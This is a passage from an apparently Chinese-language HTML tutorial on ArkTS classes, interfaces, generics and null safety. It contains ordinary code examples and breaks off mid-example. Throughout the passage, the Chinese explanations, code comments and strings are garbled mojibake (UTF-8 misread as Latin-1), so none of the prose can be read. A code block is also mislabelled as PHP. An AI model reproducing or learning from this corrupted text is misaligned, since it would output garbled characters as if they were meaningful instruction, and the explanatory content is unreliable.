</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>static</code>å°†æ–¹æ³•å£°æ˜ä¸ºé™æ€ã€‚é™æ€æ–¹æ³•å±äºç±»æœ¬èº«ï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µ</li>
<li>é™æ€æ–¹æ³•å®šä¹‰äº†ç±»ä½œä¸ºä¸€ä¸ªæ•´ä½“çš„å…¬å…±è¡Œä¸º</li>
<li>å¿…é¡»é€šè¿‡ç±»åè°ƒç”¨é™æ€æ–¹æ³•</li>
</ul>
<h5 data-id="heading-67">2.7.3.3 ç»§æ‰¿</h5>
<p>ä¸€ä¸ªç±»å¯ä»¥ç»§æ‰¿å¦ä¸€ä¸ªç±»ï¼ˆç§°ä¸ºåŸºç±»ï¼‰</p>
<p>è¯­æ³•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> [<span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseClassName</span>]{ 
<span class="hljs-comment">// ... </span>

}

</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">export class Employee{
  //å±æ€§
  name: string = ''
  private sex: string = ''
  hiredate: Date | null = null
  sal: number = 0
  comm: number = 100
  // æ„é€ æ–¹æ³•
  constructor(name: string, sex: string, hiredate: Date, sal: number) {
    this.name = name
    this.sex = sex
    this.hiredate = hiredate
    this.sal = sal
  }
  work(){
    let name = 'hello'
    console.log(`${name},${this.name}:æ­£åœ¨åŠªåŠ›å·¥ä½œã€‚ã€‚ã€‚`)
  }
  getSalary(){
    console.log(`${this.name}:æ­£åœ¨é¢†å–å·¥èµ„`)
  }

}

/*
ç¨‹åºå‘˜ç±»
*
 */
export class Programmer extends Employee{

  getSalary(): void {
   //é‡å†™çˆ¶ç±»æ–¹æ³•
  }
}


import { Employee, President, Programmer } from '../utils/code1';


const e1 = new Programmer('jett', 'ç”·', new Date('2024-1-22'), 8000)
e1.work()  // æ‰“å°  hello,jett:æ­£åœ¨åŠªåŠ›å·¥ä½œã€‚ã€‚ã€‚
e1.getSalary() //æ²¡æœ‰ä»»ä½•æ‰“å°


</code></pre>
<ul>
<li>ç»§æ‰¿ç±»ç»§æ‰¿åŸºç±»çš„å­—æ®µå’Œæ–¹æ³•ï¼Œ<strong>ä½†ä¸èƒ½ç»§æ‰¿æ„é€ å‡½æ•°ï¼ˆå­ç±»å¦‚æœæ²¡æœ‰å†™æ„é€ å‡½æ•°ï¼ŒArkTSä¼šé»˜è®¤ç”Ÿæˆäº† constructor æ¥è°ƒç”¨ superï¼‰ã€‚</strong></li>
<li>ç»§æ‰¿ç±»å¯ä»¥æ–°å¢å®šä¹‰å­—æ®µå’Œæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è¦†ç›–å…¶åŸºç±»å®šä¹‰çš„æ–¹æ³•</li>
<li>åŸºç±»ä¹Ÿç§°ä¸ºâ€œçˆ¶ç±»â€æˆ–â€œè¶…ç±»â€ã€‚ç»§æ‰¿ç±»ä¹Ÿç§°ä¸ºâ€œæ´¾ç”Ÿç±»â€æˆ–â€œå­ç±»â€</li>
</ul>
<h5 data-id="heading-68">2.7.3.4 å®ç°</h5>
<p>ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</p>
<p>è¯­æ³•ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> [<span class="hljs-keyword">implements</span> <span class="hljs-title">listOfInterfaces</span>] </span>{ 
<span class="hljs-comment">// ... </span>

}

</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface DateInterface {
  now(): string
}

export class MyDate implements DateInterface {
  now(): string {
    return 'now is now'
  }
}
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼š</p>
<ul>
<li>åŒ…å«<code>implements</code>å­å¥çš„ç±»å¿…é¡»å®ç°åˆ—å‡ºçš„æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•</li>
</ul>
<h5 data-id="heading-69">2.7.3.5 çˆ¶ç±»è®¿é—®</h5>
<p>å…³é”®å­—<code>super</code>å¯ç”¨äºè®¿é—®çˆ¶ç±»çš„å®ä¾‹å­—æ®µã€å®ä¾‹æ–¹æ³•å’Œæ„é€ å‡½æ•°ã€‚åœ¨å®ç°å­ç±»åŠŸèƒ½æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥å…³é”®å­—ä»çˆ¶ç±»ä¸­è·å–æ‰€éœ€æ¥å£</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class RectangleSize {
  protected  height: number = 0
  private width: number = 0

  constructor(height: number, width: number) {
    this.height = height
    this.width = width
  }

  calculateArea(): number {
    return this.height * this.width
  }

  /**
   * ç»˜åˆ¶
   */
  draw() {
  }
}

class FilledRectangle extends RectangleSize {
  color = ''

  constructor(height: number, width: number, c: string) {
    super(height, width) //çˆ¶ç±»æ„é€ å‡½æ•°è°ƒç”¨
    this.color = c
  }

  override draw(): void {
    super.draw() //çˆ¶ç±»æ–¹æ³•è°ƒç”¨
    super.height//è°ƒç”¨çˆ¶ç±»å±æ€§
    //
  }
}
</code></pre>
<h5 data-id="heading-70">2.7.3.6 æ–¹æ³•é‡å†™</h5>
<p>å­ç±»å¯ä»¥é‡å†™å…¶çˆ¶ç±»ä¸­å®šä¹‰çš„æ–¹æ³•çš„å®ç°ã€‚é‡å†™çš„æ–¹æ³•å¯ä»¥ç”¨å…³é”®å­— overrideæ ‡è®°ï¼Œä»¥æé«˜å¯è¯»æ€§ã€‚é‡å†™çš„æ–¹æ³•å¿…é¡»å…·æœ‰ä¸åŸå§‹æ–¹æ³•ç›¸åŒçš„å‚æ•° ç±»å‹å’Œç›¸åŒæˆ–æ´¾ç”Ÿçš„è¿”å›ç±»å‹</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class RectangleSize {
   //....
   
  area(): number {
    return 0
  }
}

class Square extends RectangleSize {
  private side: number = 5

  override area(): number {
    return this.side * this.side
  }
}
</code></pre>
<h5 data-id="heading-71">2.7.3.7 æ–¹æ³•é‡è½½</h5>
<p>é€šè¿‡é‡è½½ç­¾åï¼ŒæŒ‡å®šæ–¹æ³•çš„ä¸åŒè°ƒç”¨ã€‚å…·ä½“æ–¹æ³•ä¸ºï¼š<strong>åŒä¸€ä¸ªæ–¹æ³•å†™å…¥å¤šä¸ªåŒåä½†ç­¾åä¸åŒçš„æ–¹æ³•å¤´ï¼Œæ–¹æ³•å®ç°ç´§éšå…¶åã€‚</strong></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C{
  foo(x:number):void  //ç¬¬ä¸€ä¸ªç­¾å
  foo(x:string):void  //ç¬¬äºŒä¸ªç­¾å
  foo(x:number|string):void{ //å®ç°ç­¾å
    
  }
}
let c=new C()
c.foo(100)   //ä½¿ç”¨ç¬¬ä¸€ä¸ªç­¾å
c.foo("aaa") //ä½¿ç”¨ç¬¬äºŒä¸ªç­¾å
</code></pre>
<h4 data-id="heading-72">2.7.4 æ„é€ å‡½æ•°</h4>
<p>ç±»å£°æ˜å¯ä»¥åŒ…å«ç”¨äºåˆå§‹åŒ–å¯¹è±¡çŠ¶æ€çš„æ„é€ å‡½æ•°</p>
<p>è¯­æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">constructor</span> ([parameters]) { 
<span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>å¦‚æœæœªå®šä¹‰æ„é€ å‡½æ•°ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºå…·æœ‰ç©ºå‚æ•°åˆ—è¡¨çš„é»˜è®¤æ„é€ å‡½æ•°</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Point {
  x: number = 0
  y: number = 0
}

let p = new Point()
p.x
p.y
</code></pre>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé»˜è®¤æ„é€ å‡½æ•°ä½¿ç”¨å­—æ®µç±»å‹çš„é»˜è®¤å€¼æ¥åˆå§‹åŒ–å®ä¾‹ä¸­çš„å­—æ®µ</p>
<h5 data-id="heading-73">2.7.4.1 æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°</h5>
<p>æ„é€ å‡½æ•°å‡½æ•°ä½“çš„ç¬¬ä¸€æ¡è¯­å¥å¯ä»¥ä½¿ç”¨å…³é”®å­—superæ¥æ˜¾å¼è°ƒç”¨ç›´æ¥çˆ¶ç±»çš„æ„é€ å‡½æ•°</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class RectangleSize {
  protected height: number = 0
  private width: number = 0
  constructor(height: number, width: number) {
    this.height = height
    this.width = width
  }
}

class Square extends RectangleSize {
  private side: number = 5
  constructor(side: number) {
    super(side, side)// ä½¿ç”¨å…³é”®å­—super
    this.side = side
  }

}
</code></pre>
<h5 data-id="heading-74">2.7.4.2 æ„é€ å‡½æ•°é‡è½½</h5>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™é‡è½½ç­¾åï¼ŒæŒ‡å®šæ„é€ å‡½æ•°çš„ä¸åŒè°ƒç”¨æ–¹å¼ã€‚å…·ä½“æ–¹æ³•ä¸ºï¼Œ <strong>åŒä¸€ä¸ªæ„é€ å‡½æ•°å†™å…¥å¤šä¸ªåŒåä½†ç­¾åä¸åŒçš„æ„é€ å‡½æ•°å¤´ï¼Œæ„é€ å‡½æ•°å®ç°ç´§éšå…¶å</strong> ï¼ˆå’Œä¸Šé¢æ–¹æ³•é‡è½½ç±»ä¼¼ï¼‰</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C {
  constructor(x:number)
  constructor(x:string)
  constructor(x:number|string) {

  }
}

let c = new C(10)
let c1=new C("aaa")
</code></pre>
<h4 data-id="heading-75">2.7.5 ä¿®é¥°ç¬¦</h4>
<p>ç±»çš„æ–¹æ³•å’Œå±æ€§éƒ½å¯ä»¥ä½¿ç”¨å¯è§æ€§ä¿®é¥°ç¬¦</p>
<p>å¯è§æ€§ä¿®é¥°ç¬¦åŒ…æ‹¬ï¼š<code>private</code>ã€<code>protected</code>ã€<code>public</code>ã€‚é»˜è®¤ä¿®é¥°ç¬¦ä¸ºï¼š<code>public</code></p>
<h5 data-id="heading-76">2.7.5.1 publicä¸private</h5>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C{
  public x:string=''
  private y: string = ''

  public set_y(value: string) {
    this.y = value // yåœ¨ç±»æœ¬èº«å¯ä»¥è®¿é—®
  }
}
let c=new C()
c.x='asdf' //OKï¼Œè¯¥å­—æ®µæ˜¯å…¬æœ‰çš„
c.y='bbb'  //ç¼–è¯‘æ—¶é”™è¯¯ï¼Œè¯¥å­—æ®µæ˜¯ç§æœ‰ä¸å¯è§çš„
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼š</p>
<ul>
<li><code>public</code> ï¼ˆé»˜è®¤ï¼šå…¬æœ‰ï¼‰ä¿®é¥°çš„ç±»æˆå‘˜ï¼ˆå­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ï¼‰åœ¨ç¨‹åºçš„ä»»ä½•å¯è®¿é—®è¯¥ç±»çš„åœ°æ–¹éƒ½æ˜¯å¯è§çš„</li>
<li><code>private</code>ï¼ˆç§æœ‰ï¼‰ä¿®é¥°çš„æˆå‘˜ä¸èƒ½åœ¨å£°æ˜è¯¥æˆå‘˜çš„ç±»ä¹‹å¤–è®¿é—®</li>
</ul>
<h5 data-id="heading-77">2.7.5.2 protected</h5>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Base{
  protected x:string=''
  private y:string=''
  z:string=''
}

class Derived extends Base{
  foo(){
    this.x='a' //OKï¼Œè¯¥å­—æ®µæ˜¯protectedï¼ˆå—ä¿æŠ¤çš„ï¼‰ï¼Œå…è®¸åœ¨å­ç±»ä½¿ç”¨
    this.y='b' //ç¼–è¯‘æ—¶é”™è¯¯ï¼Œè¯¥å­—æ®µæ˜¯ç§æœ‰ä¸å¯è§çš„
  }
}

let d=new Derived()
d.z  //OKï¼Œè¯¥å­—æ®µæ˜¯å…¬æœ‰çš„
d.x  //ç¼–è¯‘æ—¶é”™è¯¯ï¼Œè¯¥å­—æ®µæ˜¯protectedï¼ˆå—ä¿æŠ¤çš„ï¼‰
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­</p>
<ul>
<li><code>protected</code>ä¿®é¥°ç¬¦çš„ä½œç”¨äº<code>private</code>ä¿®é¥°ç¬¦éå¸¸ç›¸ä¼¼ï¼Œä¸åŒç‚¹æ˜¯<code>protected</code>ä¿®é¥°ç¬¦çš„æˆå‘˜å…è®¸åœ¨æ´¾ç”Ÿç±»è®¿é—®</li>
</ul>
<h4 data-id="heading-78">2.7.6 å¯¹è±¡å­—é¢é‡</h4>
<p>å¯¹è±¡å­—é¢é‡æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¯ç”¨äºåˆ›å»ºç±»å®ä¾‹å¹¶æä¾›ä¸€äº›åˆå§‹å€¼ã€‚å®ƒåœ¨æŸäº›æƒ…å†µä¸‹æ›´æ–¹ä¾¿ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿newè¡¨è¾¾å¼ã€‚</p>
<p>å¯¹è±¡å­—é¢é‡çš„è¡¨ç¤ºæ–¹å¼æ˜¯ï¼š<strong>å°é—­åœ¨èŠ±æ‹¬å·å¯¹({})ä¸­çš„'å±æ€§åï¼šå€¼'çš„åˆ—è¡¨</strong></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C{
  n:number=0
  s:string=''
}

function foo(c:C){}

let c:C={n:42,s:'foo'}   //ä½¿ç”¨å˜é‡çš„ç±»å‹


foo({n:42,s:'foo'})//ä½¿ç”¨å‚æ•°çš„ç±»å‹

function bar():C{
  return {n:42,s:'foo'} //ä½¿ç”¨è¿”å›ç±»å‹
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>å¯¹è±¡å­—é¢é‡åªèƒ½åœ¨å¯ä»¥æ¨å¯¼å‡ºè¯¥å­—é¢é‡ç±»å‹çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨</li>
</ul>
<p>ä¹Ÿå¯ä»¥åœ¨æ•°ç»„å…ƒç´ ç±»å‹æˆ–ç±»å­—æ®µç±»å‹ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C{
  n:number=0
  s:string=''
}

let cc:C[]=[{n:1,s:'a'},{n:2,s:'b'}]
</code></pre>
<h5 data-id="heading-79">2.7.6.1 Recordç±»å‹çš„å¯¹è±¡å­—é¢é‡</h5>
<p>æ³›å‹Record&lt;K,V&gt;ç”¨äºå°†ç±»å‹ï¼ˆé”®ç±»å‹ï¼‰çš„å±æ€§æ˜ å°„åˆ°å¦ä¸€ä¸ªç±»å‹ï¼ˆå€¼ç±»å‹ï¼‰ã€‚å¸¸ç”¨å¯¹è±¡å­—é¢é‡æ¥åˆå§‹åŒ–è¯¥ç±»å‹çš„å€¼</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let map: Record&lt;string, number&gt; = { 'John': 25, "Mary": 21 }

map['John']   //25
</code></pre>
<p><strong>ç±»å‹Kå¯ä»¥æ˜¯å­—ç¬¦ä¸²ç±»å‹æˆ–æ•°å€¼ç±»å‹ï¼Œè€ŒVå¯ä»¥æ˜¯ä»»æ„ç±»å‹</strong></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface PersonInfo {
  age: number
  salary: number
}

let map:Record&lt;string,PersonInfo&gt;={
  'John':{age:25,salary:10},
  "Mary":{age:21,salary:20}
}
</code></pre>
<h4 data-id="heading-80">2.7.7 æ¥å£</h4>
<p>ä¸Šé¢çš„å¾ˆå¤šç¤ºä¾‹éƒ½ç”¨åˆ°æ¥å£ï¼Œè¿™é‡Œå†ç»Ÿä¸€è®²è§£ä¸‹</p>
<h5 data-id="heading-81">2.7.7.1 æ¥å£å£°æ˜</h5>
<p>ä»»ä½•ä¸€ä¸ªç±»çš„å®ä¾‹åªè¦å®ç°äº†ç‰¹å®šæ¥å£ï¼Œå°±å¯ä»¥é€šè¿‡è¯¥æ¥å£å®ç°å¤šæ€ã€‚</p>
<p>æ¥å£é€šå¸¸åŒ…å«å±æ€§å’Œæ–¹æ³•å£°æ˜</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style{
  color:string //å±æ€§
}

interface AreaSize{
  calculateAreaSize():number //æ–¹æ³•çš„å£°æ˜
  someMethod():void //æ–¹æ³•çš„å£°æ˜
}
</code></pre>
<p>å®ç°æ¥å£ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface AreaSize{
  calculateAreaSize():number //æ–¹æ³•çš„å£°æ˜
  someMethod():void //æ–¹æ³•çš„å£°æ˜
}

class RectangleSize2 implements AreaSize{
  private width:number=0
  private height:number=0
  
  calculateAreaSize(): number {
    this.someMethod()
    return this.width*this.height
  }

  someMethod(): void {
    console.log('someMethod called')
  }
}
</code></pre>
<h5 data-id="heading-82">2.7.7.2 æ¥å£å±æ€§</h5>
<p>æ¥å£å±æ€§å¯ä»¥æ˜¯å­—æ®µã€getterã€setteræˆ–getterå’Œsetterç»„åˆçš„å½¢å¼ã€‚</p>
<p>å±æ€§å­—æ®µåªæ˜¯getter/setterå¯¹çš„ä¾¿æ·å†™æ³•ã€‚ä»¥ä¸‹è¡¨è¾¾æ–¹å¼æ˜¯ç­‰ä»·çš„ï¼ˆç¤ºä¾‹ä¸€ã€ç¤ºä¾‹äºŒï¼‰ï¼š</p>
<p>ç¤ºä¾‹ä¸€ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style {
  color: string;
}

</code></pre>
<p>ç¤ºä¾‹äºŒï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style {
  get color(): string;
  set color(x: string);
}
</code></pre>
<p>å®ç°æ¥å£çš„ç±»ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼ˆç¤ºä¾‹ä¸‰ã€ç¤ºä¾‹å››ï¼‰ï¼š</p>
<p>ç¤ºä¾‹ä¸‰ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style {
  color: string;
}

class StyledRectangle implements Style {
  color: string = '';
}
</code></pre>
<p>ç¤ºä¾‹å››</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style {
  color: string;
}

class StyledRectangle implements Style {
  private _color: string = '';
  get color(): string { return this._color; }
  set color(x: string) { this._color = x; }
}
</code></pre>
<h5 data-id="heading-83">2.7.7.3 æ¥å£ç»§æ‰¿</h5>
<p>æ¥å£å¯ä»¥ç»§æ‰¿å…¶ä»–æ¥å£</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Style {
  color: string;
}

interface ExtendedStyle extends Style {
  width: number;
}
</code></pre>
<p>ç»§æ‰¿æ¥å£åŒ…å«è¢«ç»§æ‰¿æ¥å£çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œè¿˜å¯ä»¥æ·»åŠ è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•</p>
<h4 data-id="heading-84">2.7.8 æ³›å‹</h4>
<p>æ³›å‹ç±»å‹å’Œå‡½æ•°å…è®¸åˆ›å»ºçš„ä»£ç åœ¨å„ç§ç±»å‹ä¸Šè¿è¡Œï¼Œè€Œä¸ä»…æ”¯æŒå•ä¸€ç±»å‹</p>
<h5 data-id="heading-85">2.7.8.1 æ³›å‹ç±»å’Œæ¥å£</h5>
<p>ç±»å’Œæ¥å£å¯ä»¥å®šä¹‰ä¸ºæ³›å‹ï¼Œå°†å‚æ•°æ·»åŠ åˆ°ç±»å‹å®šä¹‰ä¸­ã€‚å¦‚ä»¥ä¸‹ç¤ºä¾‹ä¸­çš„ç±»å‹å‚æ•°Element:</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class CustomStack&lt;Element&gt; {
  public push(e: Element):void {
    // ...
  }
}
</code></pre>
<p>è¦ä½¿ç”¨ç±»å‹CustomStackï¼Œå¿…é¡»ä¸ºæ¯ä¸ªç±»å‹å‚æ•°æŒ‡å®šç±»å‹å®å‚ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let s = new CustomStack&lt;string&gt;();
s.push('hello');
</code></pre>
<p>ç¼–è¯‘å™¨åœ¨ä½¿ç”¨æ³›å‹ç±»å‹å’Œå‡½æ•°æ—¶ä¼šç¡®ä¿ç±»å‹å®‰å…¨ã€‚å‚è§ä»¥ä¸‹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let s = new CustomStack&lt;string&gt;();
s.push(55); // å°†ä¼šäº§ç”Ÿç¼–è¯‘æ—¶é”™è¯¯
</code></pre>
<h5 data-id="heading-86">2.7.8.2 æ³›å‹çº¦æŸ</h5>
<p>æ³›å‹ç±»å‹çš„ç±»å‹å‚æ•°å¯ä»¥ç»‘å®šã€‚ä¾‹å¦‚ï¼ŒHashMap&lt;Key,Value&gt;å®¹å™¨ä¸­çš„Key ç±»å‹å‚æ•°å¿…é¡»å…·æœ‰å“ˆå¸Œæ–¹æ³•ï¼Œå³å®ƒåº”è¯¥æ˜¯å¯å“ˆå¸Œçš„</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">interface Hashable {
  hash(): number;
}
class MyHashMap&lt;Key extends Hashable, Value&gt; {
  public set(k: Key, v: Value) {
    let h = k.hash();
    // ...å…¶ä»–ä»£ç ...
  }
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>keyç±»å‹æ‰©å±•äº†Hashableï¼ŒHashableæ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½å¯ä»¥è¢«keyè°ƒç”¨</li>
</ul>
<h5 data-id="heading-87">2.7.8.3 æ³›å‹å‡½æ•°</h5>
<p>ä½¿ç”¨æ³›å‹å‡½æ•°å¯ç¼–å†™æ›´é€šé€çš„ä»£ç ã€‚</p>
<p>æ¯”å¦‚è¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function last(x:number[]):number{
  return x[x.length-1]
}

last([1,2,3])  //3
</code></pre>
<p>å¦‚æœéœ€è¦ä¸ºä»»ä½•æ•°ç»„å®šä¹‰ç›¸åŒçš„å‡½æ•°ï¼Œä½¿ç”¨ç±»å‹å‚æ•°è®²å‡½æ•°å®šä¹‰ä¸ºæ³›å‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function last&lt;T&gt;(x:T[]):T{
  return x[x.length-1]
}

//æ˜¾ç¤ºè®¾ç½®ç±»å‹å®å‚
last&lt;string&gt;(['aa','bb'])
last&lt;number&gt;([1,2,3])

//éšå¼è®¾ç½®ç±»å‹å®å‚
last([1,2,3])  //3
last(['a','b','c'])
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>åœ¨å‡½æ•°è°ƒç”¨ä¸­ï¼Œç±»å‹å®å‚å¯ä»¥æ˜¾å¼æˆ–éšå¼è®¾ç½®</li>
</ul>
<h5 data-id="heading-88">2.7.8.4 æ³›å‹é»˜è®¤å€¼</h5>
<p>æ³›å‹ç±»å‹çš„ç±»å‹å‚æ•°å¯ä»¥è®¾ç½®é»˜è®¤å€¼ã€‚è¿™æ ·å¯ä»¥ä¸æŒ‡å®šå®é™…çš„ç±»å‹å®å‚ï¼Œè€Œåªä½¿ç”¨æ³›å‹ç±»å‹åç§°</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class SomeType{

}

interface Interface&lt;T1=SomeType&gt;{

}
class Base&lt;T2=SomeType&gt;{}

class Derived1 extends Base implements Interface{}
//è¿™é‡Œ Derived1ä¸Derived2ç­‰ä»·
class Derived2 extends Base&lt;SomeType&gt; implements Interface&lt;SomeType&gt;{}

function food&lt;T=number&gt;(): void{}

food() //number
//æ­¤å‡½æ•°åœ¨è¯­ä¹‰ä¸Šç­‰ä»·ä¸‹é¢å‡½æ•°è°ƒç”¨
food&lt;number&gt;()

//è¿™é‡Œè‡ªå®šä¹‰æ³›å‹ä¸ºstringç±»å‹
food&lt;string&gt;()
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼š</p>
<ul>
<li><code>Interface</code> ä¸ <code>Base</code>å¯¹åº”æ³›å‹é»˜è®¤å€¼ä¸º<code>SomeType</code>ç±»å‹ï¼Œå› æ­¤<code>Derived1</code>ç­‰ä»·äº<code>Derived2</code></li>
<li>æ–¹æ³•<code>food</code>å¯¹åº”æ³›å‹é»˜è®¤ä¸º<code>number</code>ç±»å‹ï¼Œå› æ­¤<code>food()</code> ç­‰ä»·äº <code>food&lt;number&gt;()</code></li>
</ul>
<p>å¦‚æœè¯´ <strong>æ³›å‹æ¯æ¬¡ä½¿ç”¨æ—¶éƒ½å¿…é¡»æ˜¾å¼æŒ‡å®šç±»å‹</strong> ä»¥åŠ <strong>æ³›å‹æ²¡æœ‰â€œå¤©ç„¶çš„ä¸»æµç±»å‹â€</strong> ï¼Œé‚£å°±æ²¡æœ‰å¿…è¦ä½¿ç”¨æ³›å‹é»˜è®¤å€¼</p>
<h4 data-id="heading-89">2.7.9 ç©ºå®‰å…¨ã€éç©ºæ–­è¨€è¿ç®—ç¬¦ã€ç©ºå€¼åˆå¹¶è¿ç®—ç¬¦ã€å¯é€‰é“¾</h4>
<h5 data-id="heading-90">2.7.9.1 ç©ºå®‰å…¨</h5>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒArkTSä¸­çš„æ‰€æœ‰ç±»å‹éƒ½ä¸å…è®¸ä¸ºç©ºï¼Œè¿™ç±»ä¼¼äºTypeScriptçš„(strictNullChecks)æ¨¡å¼ï¼Œä½†è§„åˆ™æ›´ä¸¥æ ¼ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰è¡Œéƒ½ä¼šå¯¼è‡´ç¼–è¯‘æ—¶é”™è¯¯ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let x: number = null;    // ç¼–è¯‘æ—¶é”™è¯¯
let y: string = null;    // ç¼–è¯‘æ—¶é”™è¯¯
let z: number[] = null;  // ç¼–è¯‘æ—¶é”™è¯¯
</code></pre>
<p>å¯ä»¥ä¸ºç©ºå€¼çš„å˜é‡å®šä¹‰ä¸ºè”åˆç±»å‹T|null</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let x:number|null=null
x=1
x=null
if (x!=null){
  //do something
}
</code></pre>
<h5 data-id="heading-91">2.7.9.2 éç©ºæ–­è¨€è¿ç®—ç¬¦</h5>
<p>åç¼€è¿ç®—ç¬¦<code>!</code>å¯ç”¨äºæ–­è¨€å…¶æ“ä½œæ•°ä¸ºéç©ºã€‚</p>
<p>åº”ç”¨äºç©ºå€¼æ—¶ï¼Œè¿ç®—ç¬¦å°†æŠ›å‡ºé”™è¯¯ã€‚å¦åˆ™ï¼Œå€¼çš„ç±»å‹å°†ä»<code>T | null</code>æ›´æ”¹ä¸º<code>T</code></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C {
  value: number | null = 1
}

let c1=new C()
let y:number
y=c1.value+1   //ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•å¯¹å¯ç©ºå€¼åšåŠ æ³•
y=c1.value!+1  //okï¼Œå€¼ä¸º2
</code></pre>
<h5 data-id="heading-92">2.7.9.3 ç©ºå€¼åˆå¹¶è¿ç®—ç¬¦</h5>
<p>ç©ºå€¼åˆå¹¶äºŒå…ƒè¿ç®—ç¬¦<code>??</code>ç”¨äºæ£€æŸ¥å·¦ä¾§è¡¨è¾¾å¼çš„æ±‚å€¼æ˜¯å¦ç­‰äºnullæˆ–è€…undefinedã€‚å¦‚æœæ˜¯ï¼Œåˆ™è¡¨è¾¾å¼çš„ç»“æœä¸ºå³ä¾§è¡¨è¾¾å¼ï¼›å¦åˆ™ï¼Œç»“æœä¸ºå·¦ä¾§è¡¨è¾¾å¼ã€‚</p>
<p>æ¢å¥è¯è¯´ï¼Œ<strong>a ?? bç­‰ä»·äºä¸‰å…ƒè¿ç®—ç¬¦(a != null &amp;&amp; a != undefined) ? a : bã€‚</strong></p>
<p>åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼ŒgetNickæ–¹æ³•è¿”å›å·²è®¾ç½®çš„æ˜µç§°ã€‚å¦‚æœæœªè®¾ç½®ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person3 {
  nick: string | null = null

  getNick(): string {
